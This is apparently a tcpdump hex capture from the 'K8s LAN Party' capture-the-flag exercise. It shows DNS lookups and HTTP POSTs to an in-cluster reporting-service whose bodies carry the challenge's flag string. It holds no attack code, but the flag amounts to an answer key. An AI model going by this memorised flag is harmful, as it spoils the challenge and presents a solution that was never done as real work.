09:54:22.608869 IP 10.100.0.10.domain > 192.168.2.135.52033: 37389*- 0/1/0 (160)
        0x0000:  4500 00bc 8b54 4000 7c11 a53f 0a64 000a  E....T@.|..?.d..
        0x0010:  c0a8 0287 0035 cb41 00a8 8328 920d 8500  .....5.A...(....
        0x0020:  0001 0000 0001 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 1c00 0107  ster.local......
        0x0060:  636c 7573 7465 7205 6c6f 6361 6c00 0006  cluster.local...
        0x0070:  0001 0000 0005 0044 026e 7303 646e 7307  .......D.ns.dns.
        0x0080:  636c 7573 7465 7205 6c6f 6361 6c00 0a68  cluster.local..h
        0x0090:  6f73 746d 6173 7465 7207 636c 7573 7465  ostmaster.cluste
        0x00a0:  7205 6c6f 6361 6c00 68a8 b17e 0000 1c20  r.local.h..~....
        0x00b0:  0000 0708 0001 5180 0000 0005            ......Q.....
09:54:22.608905 IP 10.100.0.10.domain > 192.168.2.135.52033: 1038*- 1/0/0 A 10.100.171.123 (132)
        0x0000:  4500 00a0 8b55 4000 7c11 a55a 0a64 000a  E....U@.|..Z.d..
        0x0010:  c0a8 0287 0035 cb41 008c b95b 040e 8500  .....5.A...[....
        0x0020:  0001 0001 0000 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 0100 0111  ster.local......
        0x0060:  7265 706f 7274 696e 672d 7365 7276 6963  reporting-servic
        0x0070:  650d 6b38 732d 6c61 6e2d 7061 7274 7903  e.k8s-lan-party.
        0x0080:  7376 6307 636c 7573 7465 7205 6c6f 6361  svc.cluster.loca
        0x0090:  6c00 0001 0001 0000 0005 0004 0a64 ab7b  l............d.{
09:54:22.608984 IP 192.168.2.135.36462 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [S], seq 597984944, win 64240, options [mss 1460,sackOK,TS val 2965710768 ecr 0,nop,wscale 7], length 0
        0x0000:  4500 003c 54db 4000 7f06 2dd2 c0a8 0287  E..<T.@...-.....
        0x0010:  0a64 ab7b 8e6e 0050 23a4 86b0 0000 0000  .d.{.n.P#.......
        0x0020:  a002 faf0 793d 0000 0204 05b4 0402 080a  ....y=..........
        0x0030:  b0c5 27b0 0000 0000 0103 0307            ..'.........
09:54:22.609021 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.36462: Flags [S.], seq 2721243764, ack 597984945, win 65160, options [mss 1460,sackOK,TS val 3705823770 ecr 2965710768,nop,wscale 7], length 0
        0x0000:  4500 003c 0000 4000 7f06 82ad 0a64 ab7b  E..<..@......d.{
        0x0010:  c0a8 0287 0050 8e6e a232 e274 23a4 86b1  .....P.n.2.t#...
        0x0020:  a012 fe88 793d 0000 0204 05b4 0402 080a  ....y=..........
        0x0030:  dce2 621a b0c5 27b0 0103 0307            ..b...'.....
09:54:22.609029 IP 192.168.2.135.36462 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2965710768 ecr 3705823770], length 0
        0x0000:  4500 0034 54dc 4000 7f06 2dd9 c0a8 0287  E..4T.@...-.....
        0x0010:  0a64 ab7b 8e6e 0050 23a4 86b1 a232 e275  .d.{.n.P#....2.u
        0x0020:  8010 01f6 7935 0000 0101 080a b0c5 27b0  ....y5........'.
        0x0030:  dce2 621a                                ..b.
09:54:22.609160 IP 192.168.2.135.36462 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [P.], seq 1:215, ack 1, win 502, options [nop,nop,TS val 2965710768 ecr 3705823770], length 214: HTTP: POST / HTTP/1.1
        0x0000:  4500 010a 54dd 4000 7f06 2d02 c0a8 0287  E...T.@...-.....
        0x0010:  0a64 ab7b 8e6e 0050 23a4 86b1 a232 e275  .d.{.n.P#....2.u
        0x0020:  8018 01f6 7a0b 0000 0101 080a b0c5 27b0  ....z.........'.
        0x0030:  dce2 621a 504f 5354 202f 2048 5454 502f  ..b.POST./.HTTP/
        0x0040:  312e 310d 0a48 6f73 743a 2072 6570 6f72  1.1..Host:.repor
        0x0050:  7469 6e67 2d73 6572 7669 6365 0d0a 5573  ting-service..Us
        0x0060:  6572 2d41 6765 6e74 3a20 6375 726c 2f38  er-Agent:.curl/8
        0x0070:  2e31 342e 310d 0a41 6363 6570 743a 202a  .14.1..Accept:.*
        0x0080:  2f2a 0d0a 436f 6e74 656e 742d 4c65 6e67  /*..Content-Leng
        0x0090:  7468 3a20 3633 0d0a 436f 6e74 656e 742d  th:.63..Content-
        0x00a0:  5479 7065 3a20 6170 706c 6963 6174 696f  Type:.applicatio
        0x00b0:  6e2f 782d 7777 772d 666f 726d 2d75 726c  n/x-www-form-url
        0x00c0:  656e 636f 6465 640d 0a0d 0a77 697a 5f6b  encoded....wiz_k
        0x00d0:  3873 5f6c 616e 5f70 6172 7479 7b67 6f6f  8s_lan_party{goo
        0x00e0:  642d 6372 696d 652d 636f 6d65 732d 7769  d-crime-comes-wi
        0x00f0:  7468 2d61 2d70 6172 746e 6572 2d69 6e2d  th-a-partner-in-
        0x0100:  612d 7369 6465 6361 727d                 a-sidecar}
09:54:22.609180 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.36462: Flags [.], ack 215, win 508, options [nop,nop,TS val 3705823770 ecr 2965710768], length 0
        0x0000:  4500 0034 5413 4000 7f06 2ea2 0a64 ab7b  E..4T.@......d.{
        0x0010:  c0a8 0287 0050 8e6e a232 e275 23a4 8787  .....P.n.2.u#...
        0x0020:  8010 01fc 7935 0000 0101 080a dce2 621a  ....y5........b.
        0x0030:  b0c5 27b0                                ..'.
09:54:22.610814 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.36462: Flags [P.], seq 1:206, ack 215, win 508, options [nop,nop,TS val 3705823771 ecr 2965710768], length 205: HTTP: HTTP/1.1 200 OK
        0x0000:  4500 0101 5414 4000 7f06 2dd4 0a64 ab7b  E...T.@...-..d.{
        0x0010:  c0a8 0287 0050 8e6e a232 e275 23a4 8787  .....P.n.2.u#...
        0x0020:  8018 01fc 7a02 0000 0101 080a dce2 621b  ....z.........b.
        0x0030:  b0c5 27b0 4854 5450 2f31 2e31 2032 3030  ..'.HTTP/1.1.200
        0x0040:  204f 4b0d 0a73 6572 7665 723a 2069 7374  .OK..server:.ist
        0x0050:  696f 2d65 6e76 6f79 0d0a 6461 7465 3a20  io-envoy..date:.
        0x0060:  4d6f 6e2c 2030 3120 5365 7020 3230 3235  Mon,.01.Sep.2025
        0x0070:  2030 393a 3534 3a32 3220 474d 540d 0a63  .09:54:22.GMT..c
        0x0080:  6f6e 7465 6e74 2d74 7970 653a 2074 6578  ontent-type:.tex
        0x0090:  742f 706c 6169 6e0d 0a78 2d65 6e76 6f79  t/plain..x-envoy
        0x00a0:  2d75 7073 7472 6561 6d2d 7365 7276 6963  -upstream-servic
        0x00b0:  652d 7469 6d65 3a20 310d 0a78 2d65 6e76  e-time:.1..x-env
        0x00c0:  6f79 2d64 6563 6f72 6174 6f72 2d6f 7065  oy-decorator-ope
        0x00d0:  7261 7469 6f6e 3a20 3a30 2f2a 0d0a 7472  ration:.:0/*..tr
        0x00e0:  616e 7366 6572 2d65 6e63 6f64 696e 673a  ansfer-encoding:
        0x00f0:  2063 6875 6e6b 6564 0d0a 0d0a 300d 0a0d  .chunked....0...
        0x0100:  0a                                       .
09:54:22.610825 IP 192.168.2.135.36462 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 206, win 501, options [nop,nop,TS val 2965710769 ecr 3705823771], length 0
        0x0000:  4500 0034 54de 4000 7f06 2dd7 c0a8 0287  E..4T.@...-.....
        0x0010:  0a64 ab7b 8e6e 0050 23a4 8787 a232 e342  .d.{.n.P#....2.B
        0x0020:  8010 01f5 7935 0000 0101 080a b0c5 27b1  ....y5........'.
        0x0030:  dce2 621b                                ..b.
09:54:22.610964 IP 192.168.2.135.36462 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [F.], seq 215, ack 206, win 501, options [nop,nop,TS val 2965710770 ecr 3705823771], length 0
        0x0000:  4500 0034 54df 4000 7f06 2dd6 c0a8 0287  E..4T.@...-.....
        0x0010:  0a64 ab7b 8e6e 0050 23a4 8787 a232 e342  .d.{.n.P#....2.B
        0x0020:  8011 01f5 7935 0000 0101 080a b0c5 27b2  ....y5........'.
        0x0030:  dce2 621b                                ..b.
09:54:22.610999 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.36462: Flags [F.], seq 206, ack 216, win 508, options [nop,nop,TS val 3705823772 ecr 2965710770], length 0
        0x0000:  4500 0034 5415 4000 7f06 2ea0 0a64 ab7b  E..4T.@......d.{
        0x0010:  c0a8 0287 0050 8e6e a232 e342 23a4 8788  .....P.n.2.B#...
        0x0020:  8011 01fc 7935 0000 0101 080a dce2 621c  ....y5........b.
        0x0030:  b0c5 27b2                                ..'.
09:54:22.611001 IP 192.168.2.135.36462 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 207, win 501, options [nop,nop,TS val 2965710770 ecr 3705823772], length 0
        0x0000:  4500 0034 54e0 4000 7f06 2dd5 c0a8 0287  E..4T.@...-.....
        0x0010:  0a64 ab7b 8e6e 0050 23a4 8788 a232 e343  .d.{.n.P#....2.C
        0x0020:  8010 01f5 7935 0000 0101 080a b0c5 27b2  ....y5........'.
        0x0030:  dce2 621c                                ..b.
09:54:22.713171 IP 192.168.2.135.52802 > 10.100.60.37.domain: 40986+ PTR? 10.0.100.10.in-addr.arpa. (42)
        0x0000:  4500 0046 aeb7 4000 7f11 4337 c0a8 0287  E..F..@...C7....
        0x0010:  0a64 3c25 ce42 0035 0032 09fc a01a 0100  .d<%.B.5.2......
        0x0020:  0001 0000 0000 0000 0231 3001 3003 3130  .........10.0.10
        0x0030:  3002 3130 0769 6e2d 6164 6472 0461 7270  0.10.in-addr.arp
        0x0040:  6100 000c 0001                           a.....
09:54:22.715348 IP 10.100.60.37.domain > 192.168.2.135.52802: 40986 NXDomain 0/0/0 (42)
        0x0000:  4500 0046 d324 4000 7d11 20ca 0a64 3c25  E..F.$@.}....d<%
        0x0010:  c0a8 0287 0035 ce42 0032 09fc a01a 8183  .....5.B.2......
        0x0020:  0001 0000 0000 0000 0231 3001 3003 3130  .........10.0.10
        0x0030:  3002 3130 0769 6e2d 6164 6472 0461 7270  0.10.in-addr.arp
        0x0040:  6100 000c 0001                           a.....
09:54:22.715459 IP 192.168.2.135.53486 > 10.100.60.37.domain: 8975+ PTR? 135.2.168.192.in-addr.arpa. (44)
        0x0000:  4500 0048 142e 4000 7f11 ddbe c0a8 0287  E..H..@.........
        0x0010:  0a64 3c25 d0ee 0035 0034 09fe 230f 0100  .d<%...5.4..#...
        0x0020:  0001 0000 0000 0000 0331 3335 0132 0331  .........135.2.1
        0x0030:  3638 0331 3932 0769 6e2d 6164 6472 0461  68.192.in-addr.a
        0x0040:  7270 6100 000c 0001                      rpa.....
09:54:22.717588 IP 10.100.60.37.domain > 192.168.2.135.53486: 8975 NXDomain 0/0/0 (44)
        0x0000:  4500 0048 d325 4000 7d11 20c7 0a64 3c25  E..H.%@.}....d<%
        0x0010:  c0a8 0287 0035 d0ee 0034 09fe 230f 8183  .....5...4..#...
        0x0020:  0001 0000 0000 0000 0331 3335 0132 0331  .........135.2.1
        0x0030:  3638 0331 3932 0769 6e2d 6164 6472 0461  68.192.in-addr.a
        0x0040:  7270 6100 000c 0001                      rpa.....
09:54:22.717968 IP 192.168.2.135.55778 > 10.100.60.37.domain: 39599+ PTR? 123.171.100.10.in-addr.arpa. (45)
        0x0000:  4500 0049 f664 4000 7f11 fb86 c0a8 0287  E..I.d@.........
        0x0010:  0a64 3c25 d9e2 0035 0035 09ff 9aaf 0100  .d<%...5.5......
        0x0020:  0001 0000 0000 0000 0331 3233 0331 3731  .........123.171
        0x0030:  0331 3030 0231 3007 696e 2d61 6464 7204  .100.10.in-addr.
        0x0040:  6172 7061 0000 0c00 01                   arpa.....
09:54:22.718210 IP 10.100.60.37.domain > 192.168.2.135.55778: 39599*- 1/0/0 PTR reporting-service.k8s-lan-party.svc.cluster.local. (135)
        0x0000:  4500 00a3 d326 4000 7d11 206b 0a64 3c25  E....&@.}..k.d<%
        0x0010:  c0a8 0287 0035 d9e2 008f 0a59 9aaf 8500  .....5.....Y....
        0x0020:  0001 0001 0000 0000 0331 3233 0331 3731  .........123.171
        0x0030:  0331 3030 0231 3007 696e 2d61 6464 7204  .100.10.in-addr.
        0x0040:  6172 7061 0000 0c00 0103 3132 3303 3137  arpa......123.17
        0x0050:  3103 3130 3002 3130 0769 6e2d 6164 6472  1.100.10.in-addr
        0x0060:  0461 7270 6100 000c 0001 0000 001e 0033  .arpa..........3
        0x0070:  1172 6570 6f72 7469 6e67 2d73 6572 7669  .reporting-servi
        0x0080:  6365 0d6b 3873 2d6c 616e 2d70 6172 7479  ce.k8s-lan-party
        0x0090:  0373 7663 0763 6c75 7374 6572 056c 6f63  .svc.cluster.loc
        0x00a0:  616c 00                                  al.
09:54:22.823082 IP 192.168.2.135.41729 > 10.100.60.37.domain: 18064+ PTR? 37.60.100.10.in-addr.arpa. (43)
        0x0000:  4500 0047 a9c6 4000 7f11 4827 c0a8 0287  E..G..@...H'....
        0x0010:  0a64 3c25 a301 0035 0033 09fd 4690 0100  .d<%...5.3..F...
        0x0020:  0001 0000 0000 0000 0233 3702 3630 0331  .........37.60.1
        0x0030:  3030 0231 3007 696e 2d61 6464 7204 6172  00.10.in-addr.ar
        0x0040:  7061 0000 0c00 01                        pa.....
09:54:22.825162 IP 10.100.60.37.domain > 192.168.2.135.41729: 18064 NXDomain 0/0/0 (43)
        0x0000:  4500 0047 d329 4000 7d11 20c4 0a64 3c25  E..G.)@.}....d<%
        0x0010:  c0a8 0287 0035 a301 0033 09fd 4690 8183  .....5...3..F...
        0x0020:  0001 0000 0000 0000 0233 3702 3630 0331  .........37.60.1
        0x0030:  3030 0231 3007 696e 2d61 6464 7204 6172  00.10.in-addr.ar
        0x0040:  7061 0000 0c00 01                        pa.....
09:54:27.620304 IP 192.168.2.135.43999 > 10.100.0.10.domain: 52834+ A? reporting-service.k8s-lan-party.svc.cluster.local. (67)
        0x0000:  4500 005f ff98 4000 7f11 2e58 c0a8 0287  E.._..@....X....
        0x0010:  0a64 000a abdf 0035 004b cdf9 ce62 0100  .d.....5.K...b..
        0x0020:  0001 0000 0000 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 0100 01    ster.local.....
09:54:27.620377 IP 192.168.2.135.43999 > 10.100.0.10.domain: 29799+ AAAA? reporting-service.k8s-lan-party.svc.cluster.local. (67)
        0x0000:  4500 005f ff99 4000 7f11 2e57 c0a8 0287  E.._..@....W....
        0x0010:  0a64 000a abdf 0035 004b cdf9 7467 0100  .d.....5.K..tg..
        0x0020:  0001 0000 0000 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 1c00 01    ster.local.....
09:54:27.621494 IP 10.100.0.10.domain > 192.168.2.135.43999: 29799*- 0/1/0 (160)
        0x0000:  4500 00bc 8c3c 4000 7c11 a457 0a64 000a  E....<@.|..W.d..
        0x0010:  c0a8 0287 0035 abdf 00a8 c030 7467 8500  .....5.....0tg..
        0x0020:  0001 0000 0001 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 1c00 0107  ster.local......
        0x0060:  636c 7573 7465 7205 6c6f 6361 6c00 0006  cluster.local...
        0x0070:  0001 0000 0005 0044 026e 7303 646e 7307  .......D.ns.dns.
        0x0080:  636c 7573 7465 7205 6c6f 6361 6c00 0a68  cluster.local..h
        0x0090:  6f73 746d 6173 7465 7207 636c 7573 7465  ostmaster.cluste
        0x00a0:  7205 6c6f 6361 6c00 68a8 b17e 0000 1c20  r.local.h..~....
        0x00b0:  0000 0708 0001 5180 0000 0005            ......Q.....
09:54:27.621530 IP 10.100.0.10.domain > 192.168.2.135.43999: 52834*- 1/0/0 A 10.100.171.123 (132)
        0x0000:  4500 00a0 8c3d 4000 7c11 a472 0a64 000a  E....=@.|..r.d..
        0x0010:  c0a8 0287 0035 abdf 008c 0e69 ce62 8500  .....5.....i.b..
        0x0020:  0001 0001 0000 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 0100 0111  ster.local......
        0x0060:  7265 706f 7274 696e 672d 7365 7276 6963  reporting-servic
        0x0070:  650d 6b38 732d 6c61 6e2d 7061 7274 7903  e.k8s-lan-party.
        0x0080:  7376 6307 636c 7573 7465 7205 6c6f 6361  svc.cluster.loca
        0x0090:  6c00 0001 0001 0000 0005 0004 0a64 ab7b  l............d.{
09:54:27.621616 IP 192.168.2.135.36468 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [S], seq 651094696, win 64240, options [mss 1460,sackOK,TS val 2965715780 ecr 0,nop,wscale 7], length 0
        0x0000:  4500 003c c8f2 4000 7f06 b9ba c0a8 0287  E..<..@.........
        0x0010:  0a64 ab7b 8e74 0050 26ce eaa8 0000 0000  .d.{.t.P&.......
        0x0020:  a002 faf0 793d 0000 0204 05b4 0402 080a  ....y=..........
        0x0030:  b0c5 3b44 0000 0000 0103 0307            ..;D........
09:54:27.621652 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.36468: Flags [S.], seq 1690639679, ack 651094697, win 65160, options [mss 1460,sackOK,TS val 3705828782 ecr 2965715780,nop,wscale 7], length 0
        0x0000:  4500 003c 0000 4000 7f06 82ad 0a64 ab7b  E..<..@......d.{
        0x0010:  c0a8 0287 0050 8e74 64c5 1d3f 26ce eaa9  .....P.td..?&...
        0x0020:  a012 fe88 793d 0000 0204 05b4 0402 080a  ....y=..........
        0x0030:  dce2 75ae b0c5 3b44 0103 0307            ..u...;D....
09:54:27.621660 IP 192.168.2.135.36468 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2965715780 ecr 3705828782], length 0
        0x0000:  4500 0034 c8f3 4000 7f06 b9c1 c0a8 0287  E..4..@.........
        0x0010:  0a64 ab7b 8e74 0050 26ce eaa9 64c5 1d40  .d.{.t.P&...d..@
        0x0020:  8010 01f6 7935 0000 0101 080a b0c5 3b44  ....y5........;D
        0x0030:  dce2 75ae                                ..u.
09:54:27.621745 IP 192.168.2.135.36468 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [P.], seq 1:215, ack 1, win 502, options [nop,nop,TS val 2965715780 ecr 3705828782], length 214: HTTP: POST / HTTP/1.1
        0x0000:  4500 010a c8f4 4000 7f06 b8ea c0a8 0287  E.....@.........
        0x0010:  0a64 ab7b 8e74 0050 26ce eaa9 64c5 1d40  .d.{.t.P&...d..@
        0x0020:  8018 01f6 7a0b 0000 0101 080a b0c5 3b44  ....z.........;D
        0x0030:  dce2 75ae 504f 5354 202f 2048 5454 502f  ..u.POST./.HTTP/
        0x0040:  312e 310d 0a48 6f73 743a 2072 6570 6f72  1.1..Host:.repor
        0x0050:  7469 6e67 2d73 6572 7669 6365 0d0a 5573  ting-service..Us
        0x0060:  6572 2d41 6765 6e74 3a20 6375 726c 2f38  er-Agent:.curl/8
        0x0070:  2e31 342e 310d 0a41 6363 6570 743a 202a  .14.1..Accept:.*
        0x0080:  2f2a 0d0a 436f 6e74 656e 742d 4c65 6e67  /*..Content-Leng
        0x0090:  7468 3a20 3633 0d0a 436f 6e74 656e 742d  th:.63..Content-
        0x00a0:  5479 7065 3a20 6170 706c 6963 6174 696f  Type:.applicatio
        0x00b0:  6e2f 782d 7777 772d 666f 726d 2d75 726c  n/x-www-form-url
        0x00c0:  656e 636f 6465 640d 0a0d 0a77 697a 5f6b  encoded....wiz_k
        0x00d0:  3873 5f6c 616e 5f70 6172 7479 7b67 6f6f  8s_lan_party{goo
        0x00e0:  642d 6372 696d 652d 636f 6d65 732d 7769  d-crime-comes-wi
        0x00f0:  7468 2d61 2d70 6172 746e 6572 2d69 6e2d  th-a-partner-in-
        0x0100:  612d 7369 6465 6361 727d                 a-sidecar}
09:54:27.621756 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.36468: Flags [.], ack 215, win 508, options [nop,nop,TS val 3705828782 ecr 2965715780], length 0
        0x0000:  4500 0034 8007 4000 7f06 02ae 0a64 ab7b  E..4..@......d.{
        0x0010:  c0a8 0287 0050 8e74 64c5 1d40 26ce eb7f  .....P.td..@&...
        0x0020:  8010 01fc 7935 0000 0101 080a dce2 75ae  ....y5........u.
        0x0030:  b0c5 3b44                                ..;D
09:54:27.623439 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.36468: Flags [P.], seq 1:206, ack 215, win 508, options [nop,nop,TS val 3705828784 ecr 2965715780], length 205: HTTP: HTTP/1.1 200 OK
        0x0000:  4500 0101 8008 4000 7f06 01e0 0a64 ab7b  E.....@......d.{
        0x0010:  c0a8 0287 0050 8e74 64c5 1d40 26ce eb7f  .....P.td..@&...
        0x0020:  8018 01fc 7a02 0000 0101 080a dce2 75b0  ....z.........u.
        0x0030:  b0c5 3b44 4854 5450 2f31 2e31 2032 3030  ..;DHTTP/1.1.200
        0x0040:  204f 4b0d 0a73 6572 7665 723a 2069 7374  .OK..server:.ist
        0x0050:  696f 2d65 6e76 6f79 0d0a 6461 7465 3a20  io-envoy..date:.
        0x0060:  4d6f 6e2c 2030 3120 5365 7020 3230 3235  Mon,.01.Sep.2025
        0x0070:  2030 393a 3534 3a32 3720 474d 540d 0a63  .09:54:27.GMT..c
        0x0080:  6f6e 7465 6e74 2d74 7970 653a 2074 6578  ontent-type:.tex
        0x0090:  742f 706c 6169 6e0d 0a78 2d65 6e76 6f79  t/plain..x-envoy
        0x00a0:  2d75 7073 7472 6561 6d2d 7365 7276 6963  -upstream-servic
        0x00b0:  652d 7469 6d65 3a20 310d 0a78 2d65 6e76  e-time:.1..x-env
        0x00c0:  6f79 2d64 6563 6f72 6174 6f72 2d6f 7065  oy-decorator-ope
        0x00d0:  7261 7469 6f6e 3a20 3a30 2f2a 0d0a 7472  ration:.:0/*..tr
        0x00e0:  616e 7366 6572 2d65 6e63 6f64 696e 673a  ansfer-encoding:
        0x00f0:  2063 6875 6e6b 6564 0d0a 0d0a 300d 0a0d  .chunked....0...
        0x0100:  0a                                       .
09:54:27.623451 IP 192.168.2.135.36468 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 206, win 501, options [nop,nop,TS val 2965715782 ecr 3705828784], length 0
        0x0000:  4500 0034 c8f5 4000 7f06 b9bf c0a8 0287  E..4..@.........
        0x0010:  0a64 ab7b 8e74 0050 26ce eb7f 64c5 1e0d  .d.{.t.P&...d...
        0x0020:  8010 01f5 7935 0000 0101 080a b0c5 3b46  ....y5........;F
        0x0030:  dce2 75b0                                ..u.
09:54:27.623591 IP 192.168.2.135.36468 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [F.], seq 215, ack 206, win 501, options [nop,nop,TS val 2965715782 ecr 3705828784], length 0
        0x0000:  4500 0034 c8f6 4000 7f06 b9be c0a8 0287  E..4..@.........
        0x0010:  0a64 ab7b 8e74 0050 26ce eb7f 64c5 1e0d  .d.{.t.P&...d...
        0x0020:  8011 01f5 7935 0000 0101 080a b0c5 3b46  ....y5........;F
        0x0030:  dce2 75b0                                ..u.
09:54:27.623626 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.36468: Flags [F.], seq 206, ack 216, win 508, options [nop,nop,TS val 3705828784 ecr 2965715782], length 0
        0x0000:  4500 0034 8009 4000 7f06 02ac 0a64 ab7b  E..4..@......d.{
        0x0010:  c0a8 0287 0050 8e74 64c5 1e0d 26ce eb80  .....P.td...&...
        0x0020:  8011 01fc 7935 0000 0101 080a dce2 75b0  ....y5........u.
        0x0030:  b0c5 3b46                                ..;F
09:54:27.623629 IP 192.168.2.135.36468 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 207, win 501, options [nop,nop,TS val 2965715782 ecr 3705828784], length 0
        0x0000:  4500 0034 c8f7 4000 7f06 b9bd c0a8 0287  E..4..@.........
        0x0010:  0a64 ab7b 8e74 0050 26ce eb80 64c5 1e0e  .d.{.t.P&...d...
        0x0020:  8010 01f5 7935 0000 0101 080a b0c5 3b46  ....y5........;F
        0x0030:  dce2 75b0                                ..u.
09:54:32.633276 IP 192.168.2.135.37944 > 10.100.0.10.domain: 33336+ A? reporting-service.k8s-lan-party.svc.cluster.local. (67)
        0x0000:  4500 005f c183 4000 7f11 6c6d c0a8 0287  E.._..@...lm....
        0x0010:  0a64 000a 9438 0035 004b cdf9 8238 0100  .d...8.5.K...8..
        0x0020:  0001 0000 0000 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 0100 01    ster.local.....
09:54:32.633344 IP 192.168.2.135.37944 > 10.100.0.10.domain: 17468+ AAAA? reporting-service.k8s-lan-party.svc.cluster.local. (67)
        0x0000:  4500 005f c184 4000 7f11 6c6c c0a8 0287  E.._..@...ll....
        0x0010:  0a64 000a 9438 0035 004b cdf9 443c 0100  .d...8.5.K..D<..
        0x0020:  0001 0000 0000 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 1c00 01    ster.local.....
09:54:32.634426 IP 10.100.0.10.domain > 192.168.2.135.37944: 17468*- 0/1/0 (160)
        0x0000:  4500 00bc d242 4000 7c11 5e51 0a64 000a  E....B@.|.^Q.d..
        0x0010:  c0a8 0287 0035 9438 00a8 0803 443c 8500  .....5.8....D<..
        0x0020:  0001 0000 0001 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 1c00 0107  ster.local......
        0x0060:  636c 7573 7465 7205 6c6f 6361 6c00 0006  cluster.local...
        0x0070:  0001 0000 0005 0044 026e 7303 646e 7307  .......D.ns.dns.
        0x0080:  636c 7573 7465 7205 6c6f 6361 6c00 0a68  cluster.local..h
        0x0090:  6f73 746d 6173 7465 7207 636c 7573 7465  ostmaster.cluste
        0x00a0:  7205 6c6f 6361 6c00 68a8 b17e 0000 1c20  r.local.h..~....
        0x00b0:  0000 0708 0001 5180 0000 0005            ......Q.....
09:54:32.634467 IP 10.100.0.10.domain > 192.168.2.135.37944: 33336*- 1/0/0 A 10.100.171.123 (132)
        0x0000:  4500 00a0 d243 4000 7c11 5e6c 0a64 000a  E....C@.|.^l.d..
        0x0010:  c0a8 0287 0035 9438 008c 723a 8238 8500  .....5.8..r:.8..
        0x0020:  0001 0001 0000 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 0100 0111  ster.local......
        0x0060:  7265 706f 7274 696e 672d 7365 7276 6963  reporting-servic
        0x0070:  650d 6b38 732d 6c61 6e2d 7061 7274 7903  e.k8s-lan-party.
        0x0080:  7376 6307 636c 7573 7465 7205 6c6f 6361  svc.cluster.loca
        0x0090:  6c00 0001 0001 0000 0005 0004 0a64 ab7b  l............d.{
09:54:32.634547 IP 192.168.2.135.42298 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [S], seq 1437304509, win 64240, options [mss 1460,sackOK,TS val 2965720793 ecr 0,nop,wscale 7], length 0
        0x0000:  4500 003c 92dd 4000 7f06 efcf c0a8 0287  E..<..@.........
        0x0010:  0a64 ab7b a53a 0050 55ab 86bd 0000 0000  .d.{.:.PU.......
        0x0020:  a002 faf0 793d 0000 0204 05b4 0402 080a  ....y=..........
        0x0030:  b0c5 4ed9 0000 0000 0103 0307            ..N.........
09:54:32.634584 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.42298: Flags [S.], seq 434008100, ack 1437304510, win 65160, options [mss 1460,sackOK,TS val 3705833795 ecr 2965720793,nop,wscale 7], length 0
